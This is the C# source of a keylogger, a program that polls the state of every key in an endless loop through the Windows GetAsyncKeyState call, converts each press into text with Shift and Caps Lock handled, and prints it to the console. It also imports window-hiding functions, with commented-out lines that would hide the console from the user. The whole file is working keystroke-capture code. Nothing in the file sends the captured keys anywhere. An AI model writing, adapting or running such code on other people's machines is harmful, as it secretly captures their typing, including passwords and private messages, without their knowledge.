using Keylogger;
using System;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;


internal class Program
{

    [DllImport("User32.dll")]
    public static extern int GetAsyncKeyState(Int32 i);

    [DllImport("kernel32.dll")]
    static extern IntPtr GetConsoleWindow();

    [DllImport("user32.dll")]
    static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    private static void Main(string[] args)
    {
        new Program().start();
    }

    private void start()
    {
        bool shift = false;

        //hide window
        //var handle = GetConsoleWindow();
        //ShowWindow(handle, 0);

        //monitoring keys
        while (true)
        {
            shift = false;

            for (int i = 0; i < 255; i++)
            {
                int KeyState = GetAsyncKeyState(i);
                if (KeyState == 32769)
                {
                    int shiftState = GetAsyncKeyState(16);

                    if (shiftState == 32768 || shiftState == 32769)
                    {
                        shift = true;
                    }

                    string keyValue = GetStringFromEnum(i, shift);

                    Console.WriteLine(keyValue);
                }
            }
        }
    }

    private string GetStringFromEnum(int i, bool shift)
    {
        string keyValue = ((ConsoleKey)i).ToString();

        if (!Enum.IsDefined(typeof(ConsoleKey), i) && (!shift && Enum.IsDefined(typeof(ShiftKeys), i)))
        {
            keyValue = ((Keys)i).ToString();
        }

        if (shift && Enum.IsDefined(typeof(ShiftKeys), i))
        {
            keyValue = ((ShiftKeys)i).ToString();
        }

        if ((!shift && !Console.CapsLock) || (Console.CapsLock && shift))
        {
            return keyValue.ToLower();
        }

        if ((shift || Console.CapsLock) && !(Console.CapsLock && shift))
        {
            return keyValue.ToUpper();
        }

        return keyValue;
    }
}